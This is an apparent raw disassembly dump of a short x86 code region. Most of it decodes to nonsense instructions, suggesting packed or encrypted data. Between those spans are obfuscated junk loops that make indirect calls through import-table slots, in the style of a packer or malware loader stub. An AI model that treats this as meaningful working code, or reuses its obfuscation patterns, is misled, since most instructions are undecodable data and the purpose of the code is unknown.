  4073a1:	add    eax,0x88f8a732
  4073a6:	inc    ebx
  4073a7:	jl     0x40733c
  4073a9:	test   eax,0x8da20ea8
  4073ae:	adc    bl,cl
  4073b0:	data16 ror BYTE PTR [ebx-0x370f8862],0x61
  4073b8:	xor    dl,BYTE PTR [edi-0x62]
  4073bb:	jp     0x407428
  4073bd:	xlat   BYTE PTR ds:[ebx]
  4073be:	setne  ch
  4073c1:	mov    esi,0x88f0a97a
  4073c6:	sbb    BYTE PTR [edi],cl
  4073c8:	scas   al,BYTE PTR es:[edi]
  4073c9:	push   ebx
  4073ca:	sbb    eax,0x6e454f86
  4073cf:	or     ecx,edx
  4073d1:	or     esi,DWORD PTR [esi+0x469814dd]
  4073d7:	mov    edi,0x602429b8
  4073dc:	lea    eax,[edx]
  4073de:	(bad)  
  4073df:	mov    ebp,0x22fab7eb
  4073e4:	pusha  
  4073e5:	(bad)  
  4073e6:	fldenv [esi+0x1d]
  4073e9:	jmp    0x4073bc
  4073eb:	out    0x30,al
  4073ed:	in     al,0x91
  4073ef:	mov    eax,0xd11296a9
  4073f4:	or     ebp,DWORD PTR [eax-0x5]
  4073f7:	jne    0x4073c0
  4073f9:	and    ebx,DWORD PTR [ebp+0xb45de4]
  4073ff:	test   eax,0x31cc2d41
  407404:	test   al,0x99
  407406:	ds retf 0xabd4
  40740a:	jno    0x407434
  40740c:	and    DWORD PTR [edi+0x1dd718f1],ebp
  407412:	dec    eax
  407413:	std    
  407414:	shr    DWORD PTR [ebp+0x55db0d6d],cl
  40741a:	sub    edx,DWORD PTR [ebx+0x2c]
  40741d:	cmp    al,0x4b
  40741f:	ficom  DWORD PTR [edx]
  407421:	call   0xd37e7560
  407426:	cdq    
  407427:	and    al,0x6d
  407429:	ja     0x4073c2
  40742b:	xchg   dh,cl
  40742d:	mov    ds:0x240c0838,eax
  407432:	adc    eax,0xe2a98fe3
  407437:	out    0xbe,al
  407439:	mov    DWORD PTR [esp+ebx*1],ebx
  40743c:	or     eax,0xc7fc7114
  407441:	outs   dx,DWORD PTR ds:[esi]
  407442:	out    0x5a,eax
  407444:	aam    0x90
  407446:	add    DWORD PTR [edi-0x5d],esp
  407449:	lods   eax,DWORD PTR ds:[esi]
  40744a:	pop    edi
  40744b:	ret    0xe28
  40744e:	hlt    
  40744f:	inc    edi
  407450:	retf   0xab9f
  407453:	pop    ebp
  407454:	sbb    al,0x96
  407456:	aaa    
  407457:	push   ecx
  407458:	adc    esp,esi
  40745a:	rcl    ch,0xe0
  40745d:	push   es
  40745e:	les    esp,FWORD PTR [edi]
  407460:	fidiv  WORD PTR [esp+ebp*2+0x7cd8e965]
  407467:	in     eax,dx
  407468:	fs mov ebx,0x22b0aee5
  40746e:	sbb    eax,0xe35b5851
  407473:	adc    BYTE PTR [edx+0x20d0c98a],cl
  407479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40747a:	mov    DWORD PTR [edi-0x6e],esp
  40747d:	mov    bh,0xf9
  40747f:	sbb    eax,DWORD PTR [eax]
  407481:	push   edx
  407482:	pop    ss
  407483:	int3   
  407484:	dec    ebx
  407485:	jns    0x407497
  407487:	push   es
  407488:	or     DWORD PTR [ebx+0xcdfa123],0xffffffee
  40748f:	sahf   
  407490:	add    al,0x5e
  407492:	xchg   ebp,eax
  407493:	daa    
  407494:	test   al,0x51
  407496:	popa   
  407497:	mov    ebx,ebx
  407499:	jmp    0xe0eac717
  40749e:	jae    0x40748b
  4074a0:	add    al,0x77
  4074a2:	xchg   BYTE PTR [edx-0x1d4252f],ah
  4074a8:	mov    ebp,0x6015c08a
  4074ad:	adc    eax,0xea19b464
  4074b2:	sbb    al,0x4b
  4074b4:	call   0x154cdbf0
  4074b9:	inc    edx
  4074ba:	test   eax,0xe30aa5b9
  4074bf:	xchg   BYTE PTR [ebx],ch
  4074c1:	fdiv   st(1),st
  4074c3:	fwait
  4074c4:	cmp    eax,0x9dc4782a
  4074c9:	mov    DWORD PTR [esi],eax
  4074cb:	stos   BYTE PTR es:[edi],al
  4074cc:	shl    DWORD PTR [eax],0xf6
  4074cf:	cdq    
  4074d0:	jb     0x407467
  4074d2:	sub    al,0x9d
  4074d4:	ret    0xb8dc
  4074d7:	sbb    BYTE PTR [ecx+eax*8-0x49],0xd0
  4074dc:	retf   
  4074dd:	add    al,0x3d
  4074df:	call   0x21f928d
  4074e4:	fwait
  4074e5:	outs   dx,DWORD PTR ds:[esi]
  4074e6:	and    BYTE PTR [edx+ebp*2-0x2ba321a0],dl
  4074ed:	lods   eax,DWORD PTR ds:[esi]
  4074ee:	lock data16 mov ?,WORD PTR [edx]
  4074f2:	retf   0x9e0d
  4074f5:	pusha  
  4074f6:	xchg   edx,eax
  4074f7:	xor    DWORD PTR [esi+0x7c6def40],esp
  4074fd:	pop    ebx
  4074fe:	jl     0x40752e
  407500:	hlt    
  407501:	nop
  407502:	imul   eax,DWORD PTR [esi-0x130e08ba],0x33f1fb37
  40750c:	inc    eax
  40750d:	cmp    ebp,DWORD PTR [ecx+0x3d7587f]
  407513:	or     BYTE PTR cs:[edx+0x2df2982f],dh
  40751a:	stc    
  40751b:	fcmovu st,st(0)
  40751d:	mov    bl,0x25
  40751f:	sbb    DWORD PTR [ebx],0x605b799e
  407525:	call   0x5a8c:0x6dce77f9
  40752c:	add    bh,al
  40752e:	sbb    BYTE PTR [ecx-0x3e],cl
  407531:	jle    0x40759f
  407533:	ss inc esp
  407535:	jns    0x4074c6
  407537:	sub    BYTE PTR [edi+ebx*2],bh
  40753a:	imul   ebp,DWORD PTR [ebx+eax*8-0x4d4bf153],0x61
  407542:	fldenv [esi]
  407544:	pop    esi
  407545:	xchg   edi,eax
  407546:	adc    BYTE PTR [ecx-0x696a67c],ah
  40754c:	(bad)  
  40754d:	mov    bl,0x23
  40754f:	test   al,0xfb
  407551:	scas   al,BYTE PTR es:[edi]
  407552:	push   ecx
  407553:	div    BYTE PTR [ecx+0x6c]
  407556:	push   edi
  407557:	gs jnp 0x40757c
  40755a:	xchg   ebx,eax
  40755b:	fisub  DWORD PTR [ebp+ebx*8-0x29]
  40755f:	fcomp  QWORD PTR [eax-0x9]
  407562:	ins    DWORD PTR es:[edi],dx
  407563:	std    
  407564:	or     eax,0x86de31fe
  407569:	mov    ecx,0xcfd35667
  40756e:	arpl   bx,bx
  407570:	jo     0x407588
  407572:	sti    
  407573:	and    bl,ch
  407575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407576:	push   eax
  407577:	out    0x6a,al
  407579:	lods   eax,DWORD PTR ds:[esi]
  40757a:	aaa    
  40757b:	sub    BYTE PTR [eax+ebx*8+0x20d4e834],ah
  407582:	ffreep st(1)
  407584:	popf   
  407585:	xor    BYTE PTR [edi],cl
  407587:	lahf   
  407588:	inc    edi
  407589:	sahf   
  40758a:	ins    DWORD PTR es:[edi],dx
  40758b:	push   cs
  40758c:	stc    
  40758d:	pusha  
  40758e:	add    dl,BYTE PTR [esi+0x78]
  407591:	mov    ch,0x1f
  407593:	dec    ebp
  407594:	jae    0x407542
  407596:	sbb    eax,0xe9384cd5
  40759b:	push   0xec45c715
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	inc    eax
  407656:	clc    
  407657:	cmp    BYTE PTR [edx+0x11],cl
  40765a:	sar    BYTE PTR [esi+0x7e],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x407627
  407662:	hlt    
  407663:	cmp    eax,0x8846341b
  407668:	sub    ebp,DWORD PTR [ecx+0x6a]
  40766b:	adc    ah,BYTE PTR [eax+esi*1]
  40766e:	and    DWORD PTR [ebp-0x4c],edi
  407671:	ja     0x407690
  407673:	mov    cl,0x34
  407675:	pop    esi
  407676:	and    cl,ah
  407678:	mov    ch,0x50
  40767a:	out    dx,al
  40767b:	pop    edi
  40767c:	mov    edi,0xea2d08d9
  407681:	popa   
  407682:	jecxz  0x4076b0
  407684:	or     DWORD PTR [ebp+0x55f2aae8],ebp
  40768a:	add    DWORD PTR [eax],edx
  40768c:	push   esi
  40768d:	fisub  DWORD PTR [esi]
  40768f:	push   0xffffffaa
  407691:	push   esi
  407692:	mov    eax,0x26f42bbd
  407697:	pusha  
  407698:	sbb    DWORD PTR [ecx+0x24d48a9],ebx
  40769e:	icebp  
  40769f:	mov    ds,WORD PTR ds:0xe4d2ba8c
  4076a5:	mov    ch,0x1
  4076a7:	pop    esp
  4076a8:	pushf  
  4076a9:	sahf   
  4076aa:	stc    
  4076ab:	ds xor al,0xed
  4076ae:	sar    edx,0xb8
  4076b1:	adc    BYTE PTR [esi+0x48],dl
  4076b4:	fcom   QWORD PTR ds:0x41849d91
  4076ba:	lea    edx,[ecx]
  4076bc:	jmp    0x407727
  4076be:	mov    WORD PTR [edi+0x1988604c],ss
  4076c4:	mov    bl,0x88
  4076c6:	mov    esi,0x9eecca95
  4076cb:	lds    ebx,FWORD PTR [ebx-0x2a]
  4076ce:	repnz pop ebx
  4076d1:	cmp    eax,0x6230f1d
  4076d6:	or     DWORD PTR [ecx-0x5f3482db],0x4adb2990
  4076e0:	cmp    eax,0xe375d714
  4076e6:	xlat   BYTE PTR ds:[ebx]
  4076e7:	xor    bh,dl
  4076e9:	mov    WORD PTR [ebp+0x43],?
  4076ec:	and    bl,ch
  4076ee:	pop    eax
  4076ef:	or     eax,0xc20a9c88
  4076f4:	pusha  
  4076f5:	fwait
  4076f6:	add    DWORD PTR [bx+0x53],edx
  4076fa:	fstp   DWORD PTR [ecx+ebp*1+0x36]
  4076fe:	rcr    DWORD PTR [ebx],0xff
  407701:	add    ch,BYTE PTR [ebx]
  407703:	pushf  
  407704:	dec    edi
  407705:	leave  
  407706:	out    0x4b,al
  407708:	loope  0x4076b2
  40770a:	jp     0x407721
  40770c:	pop    ss
  40770d:	inc    esp
  40770e:	mov    esi,0x4486c004
  407713:	call   0x1b8f:0x7b8861c5
  40771a:	xchg   dh,al
  40771c:	pop    ebx
  40771d:	ret    0x1b3c
  407720:	dec    esp
  407721:	and    eax,0xc5aa48dc
  407726:	and    bh,0x45
  407729:	cdq    
  40772a:	out    0xcd,al
  40772c:	xlat   BYTE PTR ds:[ebx]
  40772d:	and    BYTE PTR [ebp+edx*1+0x72],al
  407731:	test   DWORD PTR [ecx],ecx
  407733:	clc    
  407734:	push   eax
  407735:	aas    
  407736:	outs   dx,BYTE PTR ds:[esi]
  407737:	pop    edi
  407738:	lds    ebx,FWORD PTR [edi-0x571eb14a]
  40773e:	xchg   ebp,eax
  40773f:	pop    eax
  407740:	dec    esp
  407741:	fs stos BYTE PTR es:[edi],al
  407743:	jae    0x4076ca
  407745:	and    DWORD PTR [ecx],0xccfe8c1c
  40774b:	or     al,0x31
  40774d:	sub    BYTE PTR [edi+0x4911de5c],al
  407753:	mov    dl,0x44
  407755:	push   ebp
  407756:	sti    
  407757:	std    
  407758:	dec    eax
  407759:	pushf  
  40775a:	fild   QWORD PTR [ecx+0x7cc9cb9c]
  407760:	push   edx
  407761:	xor    DWORD PTR [ebp+0xb3d4fd0],edi
  407767:	inc    ebp
  407768:	push   eax
  407769:	push   es
  40776a:	pop    ds
  40776b:	not    BYTE PTR [edi+0x5b]
  40776e:	mov    esp,0x73785a05
  407773:	jnp    0x40774d
  407775:	aaa    
  407776:	or     eax,0x66e39f48
  40777b:	xor    al,0x5c
  40777d:	jo     0x40771a
  40777f:	ror    DWORD PTR [ebx+0x13671a74],0xce
  407786:	jg     0x4077f6
  407788:	pop    esi
  407789:	jne    0x407803
  40778b:	mov    eax,ds:0x9a6aae4e
  407790:	add    DWORD PTR [eax+0x24a7b4fb],esp
  407796:	fxch   st(7)
  407798:	js     0x4077c2
  40779a:	dec    esp
  40779b:	jl     0x407723
  40779d:	add    al,0xe5
  40779f:	js     0x40781d
  4077a1:	addr16 or ah,dl
  4077a4:	add    al,0x6a
  4077a6:	mov    eax,0x33c30fd3
  4077ab:	jge    0x4077e4
  4077ad:	sti    
  4077ae:	call   0xb6f8:0xe65ca5ab
  4077b5:	jne    0x4077e7
  4077b7:	xchg   BYTE PTR [ecx],bh
  4077b9:	cmp    eax,0x9fab4e1
  4077be:	iret   
  4077bf:	call   0xebee53af
  4077c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077c5:	lea    edi,[edi+ecx*2+0x17]
  4077c9:	dec    eax
  4077ca:	pop    esi
  4077cb:	mov    WORD PTR [edi],cs
  4077cd:	sub    edi,esi
  4077cf:	gs cld 
  4077d1:	xor    al,0x5e
  4077d3:	enter  0x7da3,0x17
  4077d7:	add    esp,DWORD PTR [esi+0x7d]
  4077da:	mov    gs:0x84ae9fad,al
  4077e0:	cli    
  4077e1:	int    0xa
  4077e3:	popf   
  4077e4:	push   cs
  4077e5:	mov    ch,0x7e
  4077e7:	sub    esi,DWORD PTR [edx+edx*1]
  4077ea:	std    
  4077eb:	pop    ecx
  4077ec:	fild   DWORD PTR [esi+edi*2-0x29]
  4077f0:	pop    esp
  4077f1:	test   DWORD PTR [edi],eax
  4077f3:	mov    ch,0xe1
  4077f5:	sbb    ebx,ebp
  4077f7:	sub    ch,BYTE PTR [esi+0xc]
  4077fa:	or     BYTE PTR [eax-0x1e77e36a],ah
  407800:	xchg   ebx,eax
  407801:	test   eax,0x516ad942
  407806:	inc    eax
  407807:	and    eax,0xc1b62287
  40780c:	(bad)  
  40780d:	aas    
  40780e:	mov    DWORD PTR [edi-0x1b04fcc9],edi
  407814:	xchg   edi,eax
  407815:	ficomp WORD PTR [ebp+0x31917029]
  40781b:	test   al,0xa4
  40781d:	jns    0x40783b
  40781f:	sub    BYTE PTR [eax],dh
  407821:	stc    
  407822:	(bad)  
  407823:	xchg   ecx,eax
  407824:	and    bl,BYTE PTR [eax+0x68b16560]
  40782a:	fwait
  40782b:	ror    ecx,cl
  40782d:	outs   dx,BYTE PTR ds:[esi]
  40782e:	mov    esp,0x2c2f852a
  407833:	pop    esi
  407834:	xchg   edx,eax
  407835:	(bad)  
  407836:	call   0x31ffec9b
  40783b:	std    
  40783c:	outs   dx,BYTE PTR ds:[esi]
  40783d:	je     0x407860
  40783f:	add    al,0x99
  407841:	pop    es
  407842:	in     eax,dx
  407843:	outs   dx,DWORD PTR ds:[esi]
  407844:	aam    0xc1
  407846:	dec    ebx
  407847:	xchg   BYTE PTR [esi],ch
  407849:	inc    edi
  40784a:	jno    0x4078c7
  40784c:	jbe    0x407864
  40784e:	fidivr DWORD PTR [ebx]
  407850:	stc    
  407851:	clc    
  407852:	mov    bl,0xf5
  407854:	add    eax,0xa26b895
  407859:	hlt    
  40785a:	xchg   DWORD PTR [esi+0x24d58a1a],ecx
  407860:	nop
  407861:	xor    al,0x4c
  407863:	retf   
  407864:	fs push esp
  407866:	sub    ebx,DWORD PTR [edx-0x621db27e]
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xef,eax
  407922:	dec    esp
  407923:	adc    esi,esp
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0xf47e7e7c
  40792e:	mov    bh,0xdb
  407930:	xchg   esi,eax
  407931:	in     eax,0xbb
  407933:	mov    WORD PTR [ebp-0x25],?
  407936:	inc    ebx
  407937:	(bad)  
  407939:	out    dx,al
  40793a:	mov    ah,0xfa
  40793c:	sar    DWORD PTR [edi],cl
  40793e:	mov    BYTE PTR ds:0x3f5c4dbc,cl
  407944:	jno    0x4078e5
  407946:	xor    eax,0xd2fed460
  40794b:	ins    DWORD PTR es:[edi],dx
  40794c:	jp     0x40799e
  40794e:	cmc    
  40794f:	leave  
  407950:	je     0x407938
  407952:	retf   
  407953:	data16 (bad) 
  407955:	retf   0x1357
  407958:	dec    edi
  407959:	jg     0x407924
  40795b:	jnp    0x40796a
  40795d:	mov    ecx,0x50658993
  407962:	mov    bh,0x6
  407964:	cwde   
  407965:	xor    DWORD PTR [eax-0x6b7af75c],esp
  40796b:	xor    cl,0xf8
  40796e:	sbb    al,0xba
  407970:	jge    0x407902
  407972:	int    0xdb
  407974:	jne    0x4079d9
  407976:	mov    ?,eax
  407978:	fdivr  st,st(4)
  40797a:	lds    eax,FWORD PTR [esi-0x55fa8148]
  407980:	inc    ecx
  407981:	sbb    eax,DWORD PTR [esi]
  407983:	mov    DWORD PTR [ebx],esp
  407985:	mov    al,0xe5
  407987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407988:	fbld   TBYTE PTR [edi+0xe]
  40798b:	sahf   
  40798c:	aas    
  40798d:	bound  ebx,QWORD PTR es:[esi-0x5b82099f]
  407994:	fimul  WORD PTR [edi-0x69]
  407997:	gs maskmovq mm7,(bad)
  407999:	idiv   DWORD PTR [esp+ebx*8]
  40799c:	es imul ebx,DWORD PTR gs:[eax-0x3c4016b8],0xfffffffe
  4079a5:	push   0x7743fe1b
  4079aa:	aam    0xe1
  4079ac:	push   edx
  4079ad:	pop    esi
  4079ae:	and    DWORD PTR [eax],ecx
  4079b0:	scas   eax,DWORD PTR es:[edi]
  4079b1:	dec    edx
  4079b2:	mov    eax,ds:0x136cefbb
  4079b7:	mov    ecx,0xf31ab8e1
  4079bc:	or     DWORD PTR [edi],0xdd7e9474
  4079c2:	fcomp  QWORD PTR [eax]
  4079c4:	gs pop ebp
  4079c6:	inc    ecx
  4079c7:	cli    
  4079c8:	or     eax,0x7d47aa54
  4079cd:	arpl   cx,bp
  4079cf:	adc    edx,eax
  4079d1:	mov    al,BYTE PTR [ebx+0x2f]
  4079d4:	add    bh,BYTE PTR [esp+eiz*2]
  4079d7:	jecxz  0x4079fb
  4079d9:	push   esi
  4079da:	inc    eax
  4079db:	jno    0x407a07
  4079dd:	or     al,0x4a
  4079df:	push   esp
  4079e0:	rcr    BYTE PTR [ecx+0x7e],0x5d
  4079e4:	inc    ebx
  4079e5:	outs   dx,BYTE PTR ds:[esi]
  4079e6:	adc    al,0xda
  4079e8:	(bad)  [eax]
  4079ea:	cwde   
  4079eb:	push   edi
  4079ec:	ror    BYTE PTR [ebx+0x4f],1
  4079ef:	xchg   esp,eax
  4079f0:	pop    edx
  4079f1:	addr16 pop ebp
  4079f3:	out    0x3b,eax
  4079f5:	out    0xe4,al
  4079f7:	pmaxub mm5,QWORD PTR [edx-0x2512ed1a]
  4079fe:	adc    DWORD PTR [edi-0x41115837],eax
  407a04:	fdiv   DWORD PTR [edi]
  407a06:	inc    esi
  407a07:	hlt    
  407a08:	dec    edi
  407a09:	daa    
  407a0a:	cs xor al,0xd9
  407a0d:	sub    al,0x41
  407a0f:	(bad)  
  407a10:	sar    DWORD PTR [edx+0x2f],1
  407a13:	jp     0x407a54
  407a15:	sub    DWORD PTR [edx],esp
  407a17:	xor    al,0x9f
  407a19:	repz xchg ecx,eax
  407a1b:	push   0xdbb82e52
  407a20:	call   0xed9e7968
  407a25:	mov    dl,0xb8
  407a27:	jle    0x4079fc
  407a29:	and    ch,BYTE PTR [esi-0x72]
  407a2c:	mov    al,0xd5
  407a2e:	stos   BYTE PTR es:[edi],al
  407a2f:	sub    al,0xe7
  407a31:	jbe    0x4079c6
  407a33:	mov    eax,0x8a95e9c4
  407a38:	mov    BYTE PTR [ebx],dl
  407a3a:	(bad)  
  407a3b:	lock or eax,0xd91b897f
  407a41:	sahf   
  407a42:	push   ebp
  407a43:	mov    edx,0x8ce5eb03
  407a48:	scas   al,BYTE PTR es:[edi]
  407a49:	jg     0x407a23
  407a4b:	add    DWORD PTR [ebp+0x12ac339e],ecx
  407a51:	jmp    0x407a94
  407a53:	lock jmp 0x4079da
  407a56:	ds stos DWORD PTR es:[edi],eax
  407a58:	fwait
  407a59:	cmp    cl,0x7e
  407a5c:	pop    edi
  407a5d:	(bad)
  407a60:	retf   
  407a61:	pushf  
  407a62:	and    al,0x9f
  407a64:	jecxz  0x407aad
  407a66:	pop    ebx
  407a67:	pop    edi
  407a68:	sti    
  407a69:	fld    DWORD PTR [ebp+0x72]
  407a6c:	push   ss
  407a6d:	cmp    al,0xf6
  407a6f:	test   DWORD PTR [esi+0x5c],esp
  407a72:	stos   BYTE PTR es:[edi],al
  407a73:	xor    ecx,DWORD PTR [edx+0x10]
  407a76:	sub    al,0x80
  407a78:	(bad)  
  407a79:	fadd   DWORD PTR [edi]
  407a7b:	ds pop eax
  407a7d:	cmp    dh,cl
  407a7f:	dec    edi
  407a80:	sar    BYTE PTR [esi],cl
  407a82:	push   cs
  407a83:	xchg   edi,eax
  407a84:	aad    0x55
  407a86:	mov    ch,0x56
  407a88:	jp     0x407a7d
  407a8a:	adc    al,0x12
  407a8c:	in     al,dx
  407a8d:	xchg   ebp,eax
  407a8e:	(bad)  
  407a8f:	(bad)  
  407a90:	and    al,0x4c
  407a92:	inc    esi
  407a93:	aaa    
  407a94:	ds int3 
  407a96:	aad    0x9e
  407a98:	mov    ebp,DWORD PTR [ebx]
  407a9a:	cli    
  407a9b:	push   cs
  407a9c:	(bad)  
  407a9d:	retf   0x32e5
  407aa0:	(bad)  
  407aa2:	cmp    ecx,DWORD PTR [eax+ecx*8+0x13455d0c]
  407aa9:	xor    esp,edi
  407aab:	xor    al,BYTE PTR [eiz*1+0x5dcd9e5c]
  407ab2:	mov    esp,DWORD PTR [esi+0x4896fe1e]
  407ab8:	and    esi,DWORD PTR [edx-0x17107695]
  407abe:	(bad)  
  407abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ac0:	icebp  
  407ac1:	xor    DWORD PTR [ebp-0x3553ec19],ebx
  407ac7:	mov    al,ds:0xb40fb49a
  407acc:	test   al,0x42
  407ace:	out    0xe5,al
  407ad0:	cmp    BYTE PTR [ebp+0x54],ah
  407ad3:	add    cl,BYTE PTR [edi]
  407ad5:	inc    edi
  407ad6:	jae    0x407b54
  407ad8:	sub    al,0x9f
  407ada:	test   eax,0x6484ee37
  407adf:	js     0x407a63
  407ae1:	sbb    BYTE PTR [eax+0x4a],ch
  407ae4:	in     al,dx
  407ae5:	mov    cl,0x20
  407ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ae8:	in     al,0x2d
  407aea:	hlt    
  407aeb:	cmp    ch,BYTE PTR [eax+ebx*4+0x780e5451]
  407af2:	mov    eax,0xe803702d
  407af7:	and    al,0xda
  407af9:	or     eax,0x7b83db1c
  407afe:	inc    ebx
  407aff:	push   0xc8fa9abd
  407b04:	jp     0x407b3b
  407b06:	fnsave [esi-0x55144a24]
  407b0c:	jg     0x407aa9
  407b0e:	iret   
  407b0f:	into   
  407b10:	lock push es
  407b12:	loope  0x407b55
  407b14:	fs lock pop ss
  407b17:	xchg   DWORD PTR [edx+0x5a],edx
  407b1a:	xchg   edi,eax
  407b1b:	push   ebx
  407b1c:	cmp    esp,DWORD PTR [ebx]
  407b1e:	sahf   
  407b1f:	jae    0x407aa5
  407b21:	in     al,0xa1
  407b23:	int    0xe3
  407b25:	xchg   esi,eax
  407b26:	xchg   ebx,eax
  407b27:	add    DWORD PTR [eax+0x7f9d5137],esp
  407b2d:	xchg   esp,eax
  407b2e:	xor    DWORD PTR [ebp+0x1fdbbc8b],eax
  407b34:	mov    es,WORD PTR [ebp-0x32]
  407b37:	push   eax
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x4336ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	or     DWORD PTR [edi+0x48],edx
  407c4d:	xchg   edi,eax
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0xc27e7e7c
  407c57:	mov    BYTE PTR [edx+0x12],ch
  407c5a:	in     eax,0x2e
  407c5c:	test   DWORD PTR [ebx+edx*1],ecx
  407c5f:	mov    ebp,0x26ecfc87
  407c64:	xlat   BYTE PTR ds:[ebx]
  407c65:	pop    eax
  407c66:	or     ch,BYTE PTR [bx]
  407c69:	ret    0x202e
  407c6c:	lock outs dx,DWORD PTR ds:[esi]
  407c6e:	xor    BYTE PTR [edi],bl
  407c70:	dec    edx
  407c71:	sub    DWORD PTR cs:[edi-0x546bd041],ebp
  407c78:	je     0x407c72
